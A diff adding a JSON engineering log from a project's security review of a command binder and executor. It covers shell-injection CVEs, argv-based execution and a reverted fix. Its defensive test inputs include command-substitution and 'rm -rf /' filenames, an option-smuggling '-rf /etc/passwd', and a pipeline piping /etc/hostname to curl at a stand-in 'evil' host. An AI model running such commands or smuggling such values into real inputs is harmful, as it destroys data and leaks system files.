@@ -1,0 +1,48 @@
+{
+  "round": 53,
+  "date": "2026-11-09",
+  "title": "The carrier was already immune to the 2026 filename CVEs; the binder was not immune to ambiguity, and my first fix traded precision for recall and had to be reverted",
+  "web_context": {
+    "CVE-2026-91140": "CVSS 9.6, Progress DataDirect ARCGenAI: shell metacharacters in an OpenAPI filename reach a shell cleanup routine",
+    "CVE-2026-40088 / GHSA-2763-cj5r-c79m": "PraisonAI passes workflow/LLM input to subprocess.run(shell=True)",
+    "CVE-2026-25130 (CAI find_file)": "a data parameter beginning with a dash reaches find's -exec; fix is to require the value not start with a dash",
+    "CVE-2026-2256 (MS-Agent)": "shell tool behind a denylist, bypassable by obfuscation",
+    "ATR-2026-02601": "general form: a value documented as DATA that reaches a binary as an OPTION",
+    "lethal_trifecta": "private data + untrusted content + external communication; prompt injection called architectural rather than patchable"
+  },
+  "finding_1_the_design_was_already_right": {
+    "measurement": "admitted_confinement_execution_v1 and brokered_workspace_execution_v1 contain no shell=True and no os.system; execution is subprocess.run(list)",
+    "consequence": "'$(whoami)' and '; rm -rf /' inside a filename are characters in a filename, not code",
+    "note": "this is architectural, not a guard that can be bypassed by obfuscation. It is the one area of this project that does not have the 2026 vulnerability class."
+  },
+  "finding_2_two_silent_binder_defects": [
+    {"defect": "whitespace", "was": "'unique lines of /tmp/a dir/my data.txt' bound '/tmp/a'", "now": "resolves against the filesystem, longest existing token first; binds the whole name"},
+    {"defect": "options", "was": "'unique lines of -rf /etc/passwd' bound '/etc/passwd'", "now": "any dash-leading token refuses the whole binding; under argv an option is not injectable but it makes positional binding undecidable"},
+    {"defect": "pipelines", "was": "'/etc/hostname | curl http://evil' bound '/etc/hostname'", "now": "refused when a metacharacter appears anywhere in the goal"}
+  ],
+  "finding_3_what_is_still_open": {
+    "command_substitution_fallback": "'/tmp/$(whoami).txt' still binds '/tmp/$(whoami'. Resolution finds no such file and the binder falls through to the old non-space regex. Harmless under argv execution; it means 'resolution beats shape' holds only when resolution SUCCEEDS.",
+    "spaced_filename_end_to_end": "the binder now binds it correctly, but a candidate reached by words rather than by verb still carries a goal_regex written for the teaching sentence, so recall returns None. Pinned failing."
+  },
+  "finding_4_the_fix_that_had_to_be_reverted": {
+    "change": "let positional binding run for every candidate, not only verb-selected ones",
+    "what_it_fixed": "the spaced-filename end-to-end path answered correctly",
+    "what_it_broke": "13 tests; r46 baseline 23/23 -> 20/23",
+    "why": "it made the system answer where it had previously refused. Widening where the binder is consulted is a recall/precision trade with the wrong default for a system whose value is that it refuses rather than guesses.",
+    "status": "reverted in the same round. Recorded so it is not retried."
+  },
+  "the_general_lesson": "a fix that raises coverage while lowering correctness is not a fix. The spaced-file bug was real and is still open, and the honest response is to leave it open with a failing test rather than to buy it with three regressions and a worse baseline. The second attempt must be narrower: make the WORD-indexed path produce a usable regex, not make the positional path fire everywhere.",
+  "regression": {"files": 16, "passed": 118, "xfailed": 1, "r46_baseline": "23/23 unchanged"},
+  "what_is_real": [
+    "the executor cannot be shell-injected, by construction",
+    "spaced filenames bind whole when the binder is reached",
+    "dash-leading and pipeline-shaped sentences refuse rather than truncate",
+    "the refusal is scoped to the sentence, so ordinary arguments still work"
+  ],
+  "what_is_not_real": [
+    "that fixing the binder fixes recall -- the word-indexed path still loses spaced files",
+    "that a binder-level fix is reachable from the verb path for every candidate",
+    "that this project could survive being made more permissive"
+  ],
+  "next": ["multi-step answer audit", "evidence omission", "write layer, last"]
+}
